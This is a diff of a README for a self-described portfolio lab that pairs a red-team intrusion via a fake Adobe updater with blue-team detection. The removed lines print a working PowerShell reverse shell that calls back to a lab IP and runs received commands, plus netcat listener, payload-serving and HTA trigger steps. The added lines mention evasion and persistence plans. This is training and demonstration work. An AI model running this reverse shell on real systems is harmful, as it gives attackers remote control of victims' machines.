@@ -1,10 +1,10 @@
 ### 💀 AdobeUpdater Intrusion Lab: Red Team Attack + Blue Team Detection 🛡️
 ---
 
-> ⚠️ This project is designed to showcase my understanding of both **offensive** and **defensive** security workflows.  
-> It was specifically created to demonstrate my skills to hiring managers for roles related to **SOC analysis**, and will later be expanded into a **full lab environment** that others can use to sharpen their detection skills.
+> ⚠️ This project was designed as a proof-of-concept (PoC) to showcase my understanding of both offensive and defensive security workflows. It was specifically created to demonstrate my skills to hiring managers for roles related to SOC analysis.
+> It's also part of a larger series — a more advanced version using WMI persistence and multi-stage execution is currently in the works.
 ---
-> This lab focuses on one specific attack path and corresponding detection workflow. While there are many techniques I could have explored, this scenario was chosen to demonstrate core red team execution and blue team triage in a clear, focused, end-to-end simulation.
+> This lab focuses on a single attack path and corresponding detection workflow. While many techniques could have been explored, this scenario was chosen to demonstrate core red team execution and blue team triage in a clear, focused, end-to-end simulation.
 
 ---
 
@@ -264,48 +264,15 @@ This section highlights suspicious process behavior observed using Sysinternals 
    `Enabled = 0`
  
 ---
+## 🧪 Known Limitations (v1)
 
+This initial version was a proof-of-concept focused on UI deception and reverse shell delivery using HTA + PowerShell.
 
-## 🚧 This section is under construction. **Full Lab Replication Coming Soon !🚧**  
-This section will include a full step-by-step guide for recreating the AdobeUpdater attack lab, including payload setup, reverse shell callback, and detection tuning.
+- ❌ Base64 encoding had reliability issues in some setups  
+- ❌ No AMSI bypass or evasion layers included  
+- ⚠️ Persistence was basic (registry Run key only)  
 
----
-> ⚠️ Educational Use Only:  
-> The following code is shown as part of a red team simulation in a controlled lab environment. Do **not** use this on unauthorized systems.
-
-## Setup Instructions 
-## 🧪 PowerShell Reverse Shell (Payload)
-
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("192.168.78.129",4444)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-  $sendback = (iex $data 2>&1 | Out-String )
-  $sendback2  = $sendback + "PS " + (pwd).Path + "> "
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-  $stream.Write($sendbyte,0,$sendbyte.Length)
-  $stream.Flush()
-}
-$client.Close()
-
-```
-
-1. **Start Netcat listener on Kali**
-   ```bash
-   nc -lvnp 443
-   ```
-
-2. **Serve the payload**
-   ```bash
-   cd payload/
-   python3 -m http.server 8888
-   ```
-
-3. **Trigger on victim**
-   - Browse to hosted `.hta` from Windows VM
-   - Execute it
+> 🚧 This project is being followed up with a more advanced version using **WMI event subscriptions**, **multi-stage payloads**, and **stealthier execution methods**.
 
 ---
 
@@ -315,6 +282,6 @@ $client.Close()
 - Avoid running on production systems
 - Always use in an isolated lab environment
 
-> **Disclaimer:** For educational use only. Do not deploy on unauthorized systems.
+> ⚠️ **Disclaimer:** For educational use only. Do not deploy on unauthorized systems.
 
 ---
